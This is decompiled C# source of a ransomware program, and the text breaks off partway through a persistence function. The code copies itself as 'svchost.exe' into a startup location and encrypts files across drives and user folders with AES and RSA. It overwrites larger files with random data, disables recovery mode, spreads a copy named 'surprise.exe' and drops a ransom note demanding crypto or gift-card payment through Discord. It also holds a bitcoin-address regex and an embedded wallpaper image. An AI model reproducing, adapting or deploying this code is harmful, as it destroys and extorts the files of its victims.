using System;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace ConsoleApplication7;

internal class Program
{
	public static class NativeMethods
	{
		public const int clp = 797;

		public static IntPtr intpreclp = new IntPtr(-3);

		[DllImport("user32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool AddClipboardFormatListener(IntPtr hwnd);

		[DllImport("user32.dll", SetLastError = true)]
		public static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);
	}

	private static string userName = Environment.UserName;

	private static string userDir = "C:\\Users\\";

	public static string appMutexRun = "7z459ajrk722yn8c5j4fg";

	public static bool encryptionAesRsa = true;

	public static string encryptedFileExtension = "";

	private static bool checkSpread = true;

	private static string spreadName = "surprise.exe";

	private static bool checkCopyRoaming = true;

	private static string processName = "svchost.exe";

	public static string appMutexRun2 = "2X28tfRmWaPyPQgvoHV";

	private static bool checkStartupFolder = true;

	private static bool checkSleep = false;

	private static int sleepTextbox = 10;

	private static string base64Image = "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";

	public static string appMutexStartup = "1qw0ll8p9m8uezhqhyd";

	private static string droppedMessageTextbox = "IMPORTANT.txt";

	private static bool checkAdminPrivilage = true;

	private static bool checkdeleteShadowCopies = false;

	private static bool checkdisableRecoveryMode = true;

	private static bool checkdeleteBackupCatalog = false;

	public static string appMutexStartup2 = "17CqMQFeuB3NTzJ";

	public static string appMutex2 = appMutexStartup2 + appMutexRun2;

	public static string staticSplit = "bc";

	public static string appMutex = staticSplit + appMutexStartup + appMutexRun;

	public static readonly Regex appMutexRegex = new Regex("(?:[13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})");

	private static string[] messages = new string[20]
	{
		"All of your files have been encrypted!", "", "You can not accses your files because your system has been infected with Ransomware to get your files back you need to contact us (our info is at the end) and send money after you send your money you will get a key to get your files back. To get your files back you can pay to check how to pay read FAQ. Your computer was infected with a ransomware virus. DO NOT RESET YOUR PC YOU CAN GET YOUR FILES BACK.", "", "Discord Username: x5yopl3cvBn#3153", "", "FAQ:", "", "How can i pay?", "",
		"You will need to add us on discord and send us a message.", "", "Why are my files encrypted?", "", "This is a Ransomware YOU executed it happens to alot of people.", "", "How much is it?", "", "You can pay in BTC,ETH or Discord Nitro,Paysafe Card,Giftcards etc", ""
	};

	private static string[] validExtensions = new string[229]
	{
		".txt", ".jar", ".dat", ".contact", ".settings", ".doc", ".docx", ".xls", ".xlsx", ".ppt",
		".pptx", ".odt", ".jpg", ".mka", ".mhtml", ".oqy", ".png", ".csv", ".py", ".sql",
		".mdb", ".php", ".asp", ".aspx", ".html", ".htm", ".xml", ".psd", ".pdf", ".xla",
		".cub", ".dae", ".indd", ".cs", ".mp3", ".mp4", ".dwg", ".zip", ".rar", ".mov",
		".rtf", ".bmp", ".mkv", ".avi", ".apk", ".lnk", ".dib", ".dic", ".dif", ".divx",
		".iso", ".7zip", ".ace", ".arj", ".bz2", ".cab", ".gzip", ".lzh", ".tar", ".jpeg",
		".xz", ".mpeg", ".torrent", ".mpg", ".core", ".pdb", ".ico", ".pas", ".db", ".wmv",
		".swf", ".cer", ".bak", ".backup", ".accdb", ".bay", ".p7c", ".exif", ".vss", ".raw",
		".m4a", ".wma", ".flv", ".sie", ".sum", ".ibank", ".wallet", ".css", ".js", ".rb",
		".crt", ".xlsm", ".xlsb", ".7z", ".cpp", ".java", ".jpe", ".ini", ".blob", ".wps",
		".docm", ".wav", ".3gp", ".webm", ".m4v", ".amv", ".m4p", ".svg", ".ods", ".bk",
		".vdi", ".vmdk", ".onepkg", ".accde", ".jsp", ".json", ".gif", ".log", ".gz", ".config",
		".vb", ".m1v", ".sln", ".pst", ".obj", ".xlam", ".djvu", ".inc", ".cvs", ".dbf",
		".tbi", ".wpd", ".dot", ".dotx", ".xltx", ".pptm", ".potx", ".potm", ".pot", ".xlw",
		".xps", ".xsd", ".xsf", ".xsl", ".kmz", ".accdr", ".stm", ".accdt", ".ppam", ".pps",
		".ppsm", ".1cd", ".3ds", ".3fr", ".3g2", ".accda", ".accdc", ".accdw", ".adp", ".ai",
		".ai3", ".ai4", ".ai5", ".ai6", ".ai7", ".ai8", ".arw", ".ascx", ".asm", ".asmx",
		".avs", ".bin", ".cfm", ".dbx", ".dcm", ".dcr", ".pict", ".rgbe", ".dwt", ".f4v",
		".exr", ".kwm", ".max", ".mda", ".mde", ".mdf", ".mdw", ".mht", ".mpv", ".msg",
		".myi", ".nef", ".odc", ".geo", ".swift", ".odm", ".odp", ".oft", ".orf", ".pfx",
		".p12", ".pl", ".pls", ".safe", ".tab", ".vbs", ".xlk", ".xlm", ".xlt", ".xltm",
		".svgz", ".slk", ".tar.gz", ".dmg", ".ps", ".psb", ".tif", ".rss", ".key", ".vob",
		".epsp", ".dc3", ".iff", ".onepkg", ".onetoc2", ".opt", ".p7b", ".pam", ".r3d"
	};

	private static Random random = new Random();

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(uint action, uint uParam, string vParam, uint winIni);

	private static void Main(string[] args)
	{
		if (AlreadyRunning())
		{
			Environment.Exit(1);
		}
		if (checkSleep)
		{
			sleepOutOfTempFolder();
		}
		if (checkAdminPrivilage)
		{
			copyResistForAdmin(processName);
		}
		else if (checkCopyRoaming)
		{
			copyRoaming(processName);
		}
		if (checkStartupFolder)
		{
			addLinkToStartup();
		}
		lookForDirectories();
		if (checkAdminPrivilage)
		{
			if (checkdeleteShadowCopies)
			{
				deleteShadowCopies();
			}
			if (checkdisableRecoveryMode)
			{
				disableRecoveryMode();
			}
			if (checkdeleteBackupCatalog)
			{
				deleteBackupCatalog();
			}
		}
		if (checkSpread)
		{
			spreadIt(spreadName);
		}
		addAndOpenNote();
		SetWallpaper(base64Image);
		new Thread((ThreadStart)delegate
		{
			Run();
		}).Start();
	}

	public static void Run()
	{
		Application.Run((Form)(object)new driveNotification.NotificationForm());
	}

	private static void sleepOutOfTempFolder()
	{
		string directoryName = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location);
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		if (directoryName != folderPath)
		{
			Thread.Sleep(sleepTextbox * 1000);
		}
	}

	private static bool AlreadyRunning()
	{
		Process[] processes = Process.GetProcesses();
		Process currentProcess = Process.GetCurrentProcess();
		Process[] array = processes;
		foreach (Process process in array)
		{
			try
			{
				if (process.Modules[0].FileName == Assembly.GetExecutingAssembly().Location && currentProcess.Id != process.Id)
				{
					return true;
				}
			}
			catch (Exception)
			{
			}
		}
		return false;
	}

	public static byte[] random_bytes(int length)
	{
		Random random = new Random();
		length++;
		byte[] array = new byte[length];
		random.NextBytes(array);
		return array;
	}

	public static string RandomString(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < length; i++)
		{
			char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
			stringBuilder.Append(value);
		}
		return stringBuilder.ToString();
	}

	public static string RandomStringForExtension(int length)
	{
		if (encryptedFileExtension == "")
		{
			StringBuilder stringBuilder = new StringBuilder();
			for (int i = 0; i < length; i++)
			{
				char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
				stringBuilder.Append(value);
			}
			return stringBuilder.ToString();
		}
		return encryptedFileExtension;
	}

	public static string Base64EncodeString(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return Convert.ToBase64String(bytes);
	}

	public static string randomEncode(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return "<EncyptedKey>" + Base64EncodeString(RandomString(41)) + "<EncyptedKey> " + RandomString(2) + Convert.ToBase64String(bytes);
	}

	private static void encryptDirectory(string location)
	{
		try
		{
			string[] files = Directory.GetFiles(location);
			bool flag = true;
			for (int i = 0; i < files.Length; i++)
			{
				try
				{
					string extension = Path.GetExtension(files[i]);
					string fileName = Path.GetFileName(files[i]);
					if (!Array.Exists(validExtensions, (string E) => E == extension.ToLower()) || !(fileName != droppedMessageTextbox))
					{
						continue;
					}
					FileInfo fileInfo = new FileInfo(files[i]);
					fileInfo.Attributes = FileAttributes.Normal;
					if (fileInfo.Length < 2117152)
					{
						if (encryptionAesRsa)
						{
							EncryptFile(files[i]);
						}
					}
					else if (fileInfo.Length > 200000000)
					{
						Random random = new Random();
						int length = random.Next(200000000, 300000000);
						string @string = Encoding.UTF8.GetString(random_bytes(length));
						File.WriteAllText(files[i], randomEncode(@string));
						File.Move(files[i], files[i] + "." + RandomStringForExtension(4));
					}
					else
					{
						string string2 = Encoding.UTF8.GetString(random_bytes(Convert.ToInt32(fileInfo.Length) / 4));
						File.WriteAllText(files[i], randomEncode(string2));
						File.Move(files[i], files[i] + "." + RandomStringForExtension(4));
					}
					if (flag)
					{
						flag = false;
						File.WriteAllLines(location + "/" + droppedMessageTextbox, messages);
					}
				}
				catch
				{
				}
			}
			string[] directories = Directory.GetDirectories(location);
			for (int j = 0; j < directories.Length; j++)
			{
				encryptDirectory(directories[j]);
			}
		}
		catch (Exception)
		{
		}
	}

	public static string rsaKey()
	{
		StringBuilder stringBuilder = new StringBuilder();
		stringBuilder.AppendLine("<?xml version=\"1.0\" encoding=\"utf-16\"?>");
		stringBuilder.AppendLine("<RSAParameters xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">");
		stringBuilder.AppendLine("  <Exponent>AQAB</Exponent>");
		stringBuilder.AppendLine("  <Modulus>vDwgi2iyAXOEdDbpT4ey3L0EUacdNEn+6NGqrc8vgu89LeSc0kJhbVl3koMi6NKRERF3SiFFGgWGO3V7U7UeHso1JWBzkXqYGBd0AYbi5JJY7UPQAGniWENF0EgEPFzEeONf2o6k9caim4T2Q8le7DO8X+FstS6jge3fHXwzImk=</Modulus>");
		stringBuilder.AppendLine("</RSAParameters>");
		return stringBuilder.ToString();
	}

	public static string CreatePassword(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < length--)
		{
			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/".Length)]);
		}
		return stringBuilder.ToString();
	}

	public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
	{
		byte[] array = null;
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		using MemoryStream memoryStream = new MemoryStream();
		using RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
		{
			cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
			cryptoStream.Close();
		}
		return memoryStream.ToArray();
	}

	public static void EncryptFile(string file)
	{
		byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
		string text = CreatePassword(20);
		byte[] bytes = Encoding.UTF8.GetBytes(text);
		byte[] inArray = AES_Encrypt(bytesToBeEncrypted, bytes);
		File.WriteAllText(file, "<EncryptedKey>" + RSAEncrypt(text, rsaKey()) + "<EncryptedKey>" + Convert.ToBase64String(inArray));
		File.Move(file, file + "." + RandomStringForExtension(4));
	}

	public static string RSAEncrypt(string textToEncrypt, string publicKeyString)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(textToEncrypt);
		using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(1024);
		try
		{
			rSACryptoServiceProvider.FromXmlString(publicKeyString.ToString());
			byte[] inArray = rSACryptoServiceProvider.Encrypt(bytes, fOAEP: true);
			return Convert.ToBase64String(inArray);
		}
		finally
		{
			rSACryptoServiceProvider.PersistKeyInCsp = false;
		}
	}

	private static void lookForDirectories()
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != "C:\\")
			{
				encryptDirectory(driveInfo.ToString());
			}
		}
		string location = userDir + userName + "\\Desktop";
		string location2 = userDir + userName + "\\Links";
		string location3 = userDir + userName + "\\Contacts";
		string location4 = userDir + userName + "\\Desktop";
		string location5 = userDir + userName + "\\Documents";
		string location6 = userDir + userName + "\\Downloads";
		string location7 = userDir + userName + "\\Pictures";
		string location8 = userDir + userName + "\\Music";
		string location9 = userDir + userName + "\\OneDrive";
		string location10 = userDir + userName + "\\Saved Games";
		string location11 = userDir + userName + "\\Favorites";
		string location12 = userDir + userName + "\\Searches";
		string location13 = userDir + userName + "\\Videos";
		encryptDirectory(location);
		encryptDirectory(location2);
		encryptDirectory(location3);
		encryptDirectory(location4);
		encryptDirectory(location5);
		encryptDirectory(location6);
		encryptDirectory(location7);
		encryptDirectory(location8);
		encryptDirectory(location9);
		encryptDirectory(location10);
		encryptDirectory(location11);
		encryptDirectory(location12);
		encryptDirectory(location13);
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonPictures));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonMusic));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonVideos));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory));
	}

	private static void copyRoaming(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
